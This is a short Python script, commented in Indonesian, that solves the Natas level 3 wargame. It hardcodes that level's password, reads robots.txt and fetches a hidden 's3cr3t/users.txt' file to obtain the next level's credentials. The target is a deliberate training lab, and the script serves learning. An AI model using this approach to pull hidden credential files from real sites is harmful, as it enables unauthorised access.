import requests
from requests.auth import HTTPBasicAuth

# Kredensial Natas 3
username = 'natas3'
password = 'QryZXc2e0zahULdHrtHxzyYkj59kUxLQ'
base_url = 'http://natas3.natas.labs.overthewire.org/'

# Step 1: Cek robots.txt
res_robots = requests.get(base_url + 'robots.txt', auth=HTTPBasicAuth(username, password))
print("robots.txt:\n", res_robots.text)

# Step 2: Akses folder rahasia /s3cr3t/
res_secret = requests.get(base_url + 's3cr3t/users.txt', auth=HTTPBasicAuth(username, password))
print("\nusers.txt:\n", res_secret.text)
